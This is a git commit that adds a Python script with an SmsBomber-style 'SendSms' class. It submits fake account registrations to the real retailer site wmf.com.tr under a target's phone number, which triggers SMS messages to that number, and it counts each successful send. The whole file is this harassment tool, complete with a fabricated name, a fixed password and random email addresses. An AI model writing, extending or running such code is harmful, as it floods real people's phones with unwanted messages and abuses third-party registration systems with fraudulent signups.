bb01954c4685edbe66eed4548ff5011a5dffa752
enesalp99 <125455033+enesalp99@users.noreply.github.com>
2023-04-07 18:13:32 +0300

    Create 31.py

---
+++ 31.py
@@ -0,0 +1,38 @@
+import requests
+from random import choice
+from string import ascii_lowercase
+from bs4 import BeautifulSoup
+from colorama import Fore, Style
+
+class SendSms():
+    adet = 0
+    
+    def __init__(self, phone, mail):
+        self.phone = str(phone)
+        if len(mail) != 0:
+            self.mail = mail
+        else:
+            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
+        
+
+    #wmf.com.tr
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
+                "confirm": "true",
+                "date_of_birth": "1956-03-01",
+                "email": self.mail,
+                "email_allowed": "true",
+                "first_name": "Memati",
+                "gender": "male",
+                "last_name": "Bas",
+                "password": "31ABC..abc31",
+                "phone": f"0{self.phone}"
+            })
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
